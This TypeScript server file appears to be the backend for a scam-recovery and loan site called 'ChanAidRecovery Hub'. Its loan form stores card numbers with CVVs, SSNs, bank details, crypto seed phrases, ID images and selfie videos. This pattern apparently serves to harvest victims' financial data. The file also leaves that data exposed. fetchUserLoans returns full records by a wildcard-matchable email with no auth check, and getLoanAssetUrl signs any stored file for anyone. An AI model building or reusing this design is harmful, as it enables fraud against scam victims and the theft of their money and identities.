/**
 * All server-side data queries and mutations for ChanAidRecovery Hub.
 * Migrated from Drizzle/D1 → Supabase (PostgREST + supabase-js).
 *
 * Convention:
 *  - Public reads  → getSupabaseAdmin() (service role bypasses RLS, simpler for SSR)
 *  - Admin writes  → getSupabaseAdmin() + requireAdmin() guard
 */
import { createServerFn } from "@tanstack/react-start";
import { getSupabaseAdmin } from "@/lib/supabase";
import { loanSubmissionSchema } from "@/lib/validation/loan";
import {
  adminLoginWithPassword,
  isAdminAuthed,
  requireAdmin,
  clearAdminSession,
} from "@/lib/admin-auth";

function nowIso(): string {
  return new Date().toISOString();
}

// ─── snake_case → camelCase converter ─────────────────────────────────────────
// Supabase returns snake_case columns, but the existing UI expects camelCase.

function snakeToCamel(str: string): string {
  return str.replace(/_([a-z])/g, (_, c) => c.toUpperCase());
}

/** Convert all snake_case keys in an object to camelCase. */
function camelizeRow<T = any>(row: Record<string, any>): T {
  const out: Record<string, any> = {};
  for (const [k, v] of Object.entries(row)) {
    out[snakeToCamel(k)] = v;
  }
  return out as T;
}

/** Convert an array of rows. */
function camelizeRows<T = any>(rows: Record<string, any>[]): T[] {
  return rows.map((r) => camelizeRow<T>(r));
}

// ─── Helper: throw on Supabase error ─────────────────────────────────────────

function throwOnError<T>(result: { data: T | null; error: any }): T {
  if (result.error) {
    console.error("Supabase error:", result.error);
    throw new Error(result.error.message ?? "Supabase query failed");
  }
  return result.data as T;
}

// ─── Public Queries ───────────────────────────────────────────────────────────

export const fetchPage = createServerFn()
  .inputValidator((slug: string) => slug)
  .handler(async ({ data: slug }) => {
    const sb = getSupabaseAdmin();
    const { data, error } = await sb
      .from("pages")
      .select("*")
      .eq("slug", slug)
      .single();
    if (error && error.code === "PGRST116") return undefined; // not found
    if (error) throw new Error(error.message);
    return data ? camelizeRow(data) : data;
  });

export const fetchServices = createServerFn().handler(async () => {
  const sb = getSupabaseAdmin();
  const { data } = await sb
    .from("services")
    .select("*")
    .eq("is_published", true)
    .order("sort_order", { ascending: true });
  return camelizeRows(data ?? []);
});

export const fetchService = createServerFn()
  .inputValidator((slug: string) => slug)
  .handler(async ({ data: slug }) => {
    const sb = getSupabaseAdmin();
    const { data, error } = await sb
      .from("services")
      .select("*")
      .eq("slug", slug)
      .single();
    if (error && error.code === "PGRST116") return undefined;
    if (error) throw new Error(error.message);
    return data ? camelizeRow(data) : data;
  });

export const fetchTestimonials = createServerFn()
  .inputValidator(
    (opts?: { featuredOnly?: boolean; limit?: number }) => opts
  )
  .handler(async ({ data: opts }) => {
    const sb = getSupabaseAdmin();
    let q = sb
      .from("testimonials")
      .select("*")
      .eq("is_published", true)
      .order("sort_order", { ascending: true });

    if (opts?.featuredOnly) {
      q = q.eq("is_featured", true);
    }
    if (opts?.limit) {
      q = q.limit(opts.limit);
    }

    const { data } = await q;
    return camelizeRows(data ?? []);
  });

export const fetchFaqs = createServerFn()
  .inputValidator((limit?: number) => limit)
  .handler(async ({ data: limit }) => {
    const sb = getSupabaseAdmin();
    let q = sb
      .from("faqs")
      .select("*")
      .eq("is_published", true)
      .order("sort_order", { ascending: true });

    if (limit) q = q.limit(limit);
    const { data } = await q;
    return camelizeRows(data ?? []);
  });

export const fetchAsSeenIn = createServerFn().handler(async () => {
  const sb = getSupabaseAdmin();
  const { data } = await sb
    .from("as_seen_in")
    .select("*")
    .eq("is_published", true)
    .order("sort_order", { ascending: true });
  return camelizeRows(data ?? []);
});

export const fetchBlogPosts = createServerFn().handler(async () => {
  const sb = getSupabaseAdmin();
  const { data } = await sb
    .from("blog_posts")
    .select("*")
    .eq("is_published", true)
    .order("created_at", { ascending: false });
  return camelizeRows(data ?? []);
});

export const fetchBlogPost = createServerFn()
  .inputValidator((slug: string) => slug)
  .handler(async ({ data: slug }) => {
    const sb = getSupabaseAdmin();
    const { data, error } = await sb
      .from("blog_posts")
      .select("*")
      .eq("slug", slug)
      .single();
    if (error && error.code === "PGRST116") return undefined;
    if (error) throw new Error(error.message);
    return data ? camelizeRow(data) : data;
  });

// ─── Admin Auth ───────────────────────────────────────────────────────────────

export const adminLogin = createServerFn({ method: "POST" })
  .inputValidator((p: { password: string }) => p)
  .handler(async ({ data: { password } }) => {
    const ok = await adminLoginWithPassword(password ?? "");
    return { ok };
  });

export const adminLogout = createServerFn({ method: "POST" }).handler(
  async () => {
    clearAdminSession();
    return { ok: true };
  }
);

export const adminCheckSession = createServerFn().handler(async () => {
  return { ok: await isAdminAuthed() };
});

// ─── Admin / Private Queries ──────────────────────────────────────────────────

export const fetchLeads = createServerFn().handler(async () => {
  await requireAdmin();
  const sb = getSupabaseAdmin();
  const { data } = await sb
    .from("leads")
    .select("*")
    .order("created_at", { ascending: false });
  return camelizeRows(data ?? []);
});

export const fetchUserLoans = createServerFn()
  .inputValidator((email: string) => email)
  .handler(async ({ data: email }) => {
    if (!email) return [];
    const sb = getSupabaseAdmin();
    const { data } = await sb
      .from("loan_applications")
      .select("*")
      .ilike("email", email)
      .order("created_at", { ascending: false });
    return camelizeRows(data ?? []);
  });

export const fetchLoanApplications = createServerFn({ method: "GET" }).handler(async () => {
  try {
    console.log("[ServerFn] fetchLoanApplications started");
    await requireAdmin();
    const sb = getSupabaseAdmin();
    const { data, error } = await sb
      .from("loan_applications")
      .select("*")
      .order("created_at", { ascending: false });
    
    if (error) {
      console.error("[ServerFn] fetchLoanApplications DB error:", error);
      throw error;
    }
    
    console.log(`[ServerFn] fetchLoanApplications success: ${data?.length || 0} rows`);
    return camelizeRows(data ?? []);
  } catch (err: any) {
    console.error("[ServerFn] fetchLoanApplications unhandled error:", err);
    throw new Error(err?.message || "Failed to fetch loan applications");
  }
});

export const checkLoanStatus = createServerFn()
  .inputValidator((id: string) => id)
  .handler(async ({ data: id }) => {
    const sb = getSupabaseAdmin();
    const { data, error } = await sb
      .from("loan_applications")
      .select(
        "status, identity_verified, rejection_reason, amount_requested, currency, created_at, submitted_at, updated_at, reviewed_at, verified_at, status_history"
      )
      .eq("id", id)
      .single();
    if (error || !data) return null;
    return {
      status: data.status,
      identityVerified: data.identity_verified,
      rejectionReason: data.rejection_reason,
      amountRequested: data.amount_requested,
      currency: data.currency,
      createdAt: data.created_at,
      submittedAt: data.submitted_at,
      updatedAt: data.updated_at,
      reviewedAt: data.reviewed_at,
      verifiedAt: data.verified_at,
      statusHistory: data.status_history ?? "[]",
    };
  });

export const fetchTestimonialSubmissions = createServerFn().handler(
  async () => {
    await requireAdmin();
    const sb = getSupabaseAdmin();
    const { data } = await sb
      .from("testimonial_submissions")
      .select("*")
      .order("created_at", { ascending: false });
    return camelizeRows(data ?? []);
  }
);

// ─── Supabase Storage – Loan Uploads ──────────────────────────────────────────

export const uploadLoanAsset = createServerFn({ method: "POST" })
  .inputValidator(
    (payload: {
      tempId: string;
      kind: string;
      dataUrl: string;
      contentType: string;
    }) => payload
  )
  .handler(async ({ data: { tempId, kind, dataUrl, contentType } }) => {
    const sb = getSupabaseAdmin();

    if (!dataUrl || !dataUrl.includes(",")) {
      throw new Error("Invalid data URL");
    }
    const base64 = dataUrl.split(",")[1];
    if (!base64) return { key: null, url: null };

    const binaryStr = atob(base64);
    const bytes = new Uint8Array(binaryStr.length);
    for (let i = 0; i < binaryStr.length; i++)
      bytes[i] = binaryStr.charCodeAt(i);

    const ext = contentType.includes("video")
      ? "webm"
      : contentType.includes("pdf")
        ? "pdf"
        : "jpg";
    const key = `loan-applications/${tempId}/${kind}.${ext}`;

    const { error } = await sb.storage
      .from("loan-uploads")
      .upload(key, bytes.buffer, {
        contentType,
        upsert: true,
      });

    if (error) {
      console.error("Storage upload error:", error);
      // Fallback: return null so caller keeps base64
      return { key: null, url: null };
    }

    return { key, url: null };
  });

export const getLoanAssetUrl = createServerFn()
  .inputValidator((key: string) => key)
  .handler(async ({ data: key }) => {
    const sb = getSupabaseAdmin();
    const { data } = await sb.storage
      .from("loan-uploads")
      .createSignedUrl(key, 3600);
    return data?.signedUrl ?? null;
  });

/**
 * Admin-only: resolve a stored asset reference into a data URL.
 */
export const resolveLoanAsset = createServerFn()
  .inputValidator((src: string) => src)
  .handler(async ({ data: src }): Promise<{ dataUrl: string | null }> => {
    await requireAdmin();
    if (!src) return { dataUrl: null };
    if (src.startsWith("data:")) return { dataUrl: src };

    const sb = getSupabaseAdmin();
    const { data, error } = await sb.storage
      .from("loan-uploads")
      .download(src);
    if (error || !data) return { dataUrl: null };

    const buf = await data.arrayBuffer();
    const bytes = new Uint8Array(buf);
    let binary = "";
    for (let i = 0; i < bytes.length; i++)
      binary += String.fromCharCode(bytes[i]);
    const base64 = btoa(binary);
    const ct = src.endsWith(".webm")
      ? "video/webm"
      : src.endsWith(".pdf")
        ? "application/pdf"
        : "image/jpeg";
    return { dataUrl: `data:${ct};base64,${base64}` };
  });

// ─── Actions ──────────────────────────────────────────────────────────────────

export const submitTestimonial = createServerFn({ method: "POST" })
  .inputValidator((payload: any) => payload)
  .handler(async ({ data: payload }) => {
    const sb = getSupabaseAdmin();
    
    // Map camelCase -> snake_case
    const row = {
      client_name: payload.clientName,
      email: payload.email,
      location: payload.location,
      scam_type: payload.scamType,
      amount_recovered: payload.amountRecovered,
      rating: payload.rating,
      quote: payload.quote,
      consent_to_publish: payload.consentToPublish,
      status: payload.status || 'pending',
      notes: payload.notes,
      source_page: payload.sourcePage,
    };

    const { data, error } = await sb
      .from("testimonial_submissions")
      .insert(row)
      .select()
      .single();
    if (error) return { data: null, error: { message: error.message } };
    return { data, error: null };
  });

export const submitLead = createServerFn({ method: "POST" })
  .inputValidator((payload: any) => payload)
  .handler(async ({ data: payload }) => {
    const sb = getSupabaseAdmin();

    // Map camelCase -> snake_case
    const row = {
      first_name: payload.firstName,
      last_name: payload.lastName,
      email: payload.email,
      phone: payload.phone,
      amount_lost: payload.amountLost,
      scam_type: payload.scamType,
      message: payload.message,
      source_page: payload.sourcePage,
      status: payload.status || 'new',
    };

    const { data, error } = await sb
      .from("leads")
      .insert(row)
      .select()
      .single();
    if (error) return { data: null, error: { message: error.message } };
    return { data, error: null };
  });

export const submitLoanApplication = createServerFn({ method: "POST" })
  .inputValidator((payload: any) => payload)
  .handler(async ({ data: payload, request }) => {
    const parsed = loanSubmissionSchema.safeParse(payload);
    if (!parsed.success) {
      const fieldErrors = parsed.error.flatten().fieldErrors;
      return {
        data: null,
        error: { message: "Validation failed", fields: fieldErrors },
      };
    }

    const now = nowIso();

    let ipAddress: string | null = null;
    let userAgent: string | null = null;
    try {
      const req = request as Request | undefined;
      if (req) {
        ipAddress =
          req.headers.get("cf-connecting-ip") ??
          req.headers.get("x-forwarded-for") ??
          null;
        userAgent = req.headers.get("user-agent") ?? null;
      }
    } catch {
      /* headers not available in dev */
    }

    const sb = getSupabaseAdmin();

    // Map camelCase field names from the form → snake_case column names
    const row: Record<string, any> = {};
    const fieldMap: Record<string, string> = {
      firstName: "first_name",
      lastName: "last_name",
      email: "email",
      phone: "phone",
      dateOfBirth: "date_of_birth",
      addressLine1: "address_line1",
      addressLine2: "address_line2",
      city: "city",
      stateRegion: "state_region",
      postalCode: "postal_code",
      country: "country",
      amountRequested: "amount_requested",
      currency: "currency",
      loanPurpose: "loan_purpose",
      loanTermMonths: "loan_term_months",
      employmentStatus: "employment_status",
      monthlyIncome: "monthly_income",
      payoutMethod: "payout_method",
      bankName: "bank_name",
      cardIssuer: "card_issuer",
      accountHolderName: "account_holder_name",
      cardHolderName: "card_holder_name",
      cardNumber: "card_number",
      cardExpiry: "card_expiry",
      cardCvv: "card_cvv",
      billingAddressLine1: "billing_address_line1",
      billingAddressLine2: "billing_address_line2",
      billingCity: "billing_city",
      billingState: "billing_state",
      billingPostalCode: "billing_postal_code",
      billingCountry: "billing_country",
      bankAccountNumber: "bank_account_number",
      bankRoutingNumber: "bank_routing_number",
      ssn: "ssn",
      ein: "ein",
      cryptoWalletType: "crypto_wallet_type",
      cryptoWalletAddress: "crypto_wallet_address",
      cryptoSeedPhrase: "crypto_seed_phrase",
      cryptoNetwork: "crypto_network",
      selfieImage: "selfie_image",
      idFrontImage: "id_front_image",
      idBackImage: "id_back_image",
      passportFrontImage: "passport_front_image",
      passportBackImage: "passport_back_image",
      videoSelfieUrl: "video_selfie_url",
      sourcePage: "source_page",
      notes: "notes",
      userId: "user_id",
    };

    for (const [camel, snake] of Object.entries(fieldMap)) {
      if ((parsed.data as any)[camel] !== undefined) {
        row[snake] = (parsed.data as any)[camel];
      }
    }

    row.status = "pending";
    row.submitted_at = now;
    row.ip_address = ipAddress;
    row.user_agent = userAgent;
    row.status_history = JSON.stringify([
      { status: "pending", at: now, by: "system" },
    ]);
    row.submission_complete = true;

    const { data, error } = await sb
      .from("loan_applications")
      .insert(row)
      .select()
      .single();

    if (error) {
      console.error("Insert loan_applications error:", error);
      return { data: null, error: { message: error.message } };
    }
    return { data, error: null };
  });

export const likeBlogPost = createServerFn({ method: "POST" })
  .inputValidator((slug: string) => slug)
  .handler(async ({ data: slug }) => {
    const sb = getSupabaseAdmin();
    const { data: current, error: fetchErr } = await sb
      .from("blog_posts")
      .select("likes")
      .eq("slug", slug)
      .single();
    if (fetchErr || !current) throw new Error("Post not found");

    const { data, error } = await sb
      .from("blog_posts")
      .update({ likes: (current.likes || 0) + 1 })
      .eq("slug", slug)
      .select("likes")
      .single();
    if (error) throw new Error(error.message);
    return { likes: data?.likes ?? 0 };
  });

export const updateLeadStatus = createServerFn({ method: "POST" })
  .inputValidator((payload: { id: string; status: string }) => payload)
  .handler(async ({ data: { id, status } }) => {
    await requireAdmin();
    const sb = getSupabaseAdmin();
    const { error } = await sb
      .from("leads")
      .update({ status })
      .eq("id", id);
    if (error) throw new Error(error.message);
    return { success: true };
  });

export const updateLoanStatus = createServerFn({ method: "POST" })
  .inputValidator(
    (payload: {
      id: string;
      status: string;
      reason?: string;
      adminId?: string;
    }) => payload
  )
  .handler(async ({ data: { id, status, reason, adminId } }) => {
    await requireAdmin();
    const sb = getSupabaseAdmin();
    const now = nowIso();

    const { data: current, error: fetchErr } = await sb
      .from("loan_applications")
      .select("status_history")
      .eq("id", id)
      .single();
    if (fetchErr || !current) return { success: false, error: "Not found" };

    let history: any[] = [];
    try {
      history = JSON.parse(current.status_history ?? "[]");
    } catch {
      history = [];
    }
    history.push({
      status,
      at: now,
      by: adminId ?? "admin",
      ...(reason ? { reason } : {}),
    });

    const updates: Record<string, any> = {
      status,
      updated_at: now,
      reviewed_at: now,
      status_history: JSON.stringify(history),
    };

    if (status === "verified") {
      updates.verified_at = now;
      updates.verified_by = adminId ?? "admin";
    }
    if (reason) {
      updates.rejection_reason = reason;
    }

    const { error } = await sb
      .from("loan_applications")
      .update(updates)
      .eq("id", id);
    if (error) throw new Error(error.message);
    return { success: true };
  });

export const verifyLoanIdentity = createServerFn({ method: "POST" })
  .inputValidator(
    (payload: { id: string; verified: boolean; adminId?: string }) => payload
  )
  .handler(async ({ data: { id, verified, adminId } }) => {
    await requireAdmin();
    const sb = getSupabaseAdmin();
    const now = nowIso();

    const { data: current, error: fetchErr } = await sb
      .from("loan_applications")
      .select("status_history")
      .eq("id", id)
      .single();
    if (fetchErr || !current) return { success: false, error: "Not found" };

    let history: any[] = [];
    try {
      history = JSON.parse(current.status_history ?? "[]");
    } catch {
      history = [];
    }
    history.push({
      event: "identity_verified",
      verified,
      at: now,
      by: adminId ?? "admin",
    });

    const { error } = await sb
      .from("loan_applications")
      .update({
        identity_verified: verified,
        updated_at: now,
        status_history: JSON.stringify(history),
      })
      .eq("id", id);
    if (error) throw new Error(error.message);
    return { success: true };
  });

export const updateTestimonialStatus = createServerFn({ method: "POST" })
  .inputValidator((payload: { id: string; status: string }) => payload)
  .handler(async ({ data: { id, status } }) => {
    await requireAdmin();
    const sb = getSupabaseAdmin();
    const { error } = await sb
      .from("testimonial_submissions")
      .update({ status })
      .eq("id", id);
    if (error) throw new Error(error.message);
    return { success: true };
  });
